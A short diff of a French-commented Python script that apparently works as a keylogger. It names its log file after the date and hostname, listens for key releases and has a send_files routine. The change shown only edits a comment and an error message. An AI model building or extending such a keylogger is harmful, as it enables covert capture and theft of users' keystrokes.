@@ -5,7 +5,7 @@ import os
 
 namefile = datetime.datetime.now().strftime("%I %M%p on %B %d %Y") +"_" + socket.gethostname() + ".txt"
 f = open(namefile, "w+")
-# crée un nouveau fichier texte intitulé date+heure.txt
+# crée un nouveau fichier texte intitulé date+heure+NOM_PC.txt
 f.close()
 
 liste = []
@@ -91,8 +91,7 @@ def list(k):
                                          #mais useless vu qu'on supprime dans send_files pour finir
         except:
             with open(namefile, "a") as f:
-                f.write("send_files error")
-
+                f.write("\n send_files ERROR \n")
 def on_release(key):
     global ctrl_l, alt_r, shift, caps
     if key == keyboard.Key.f10:
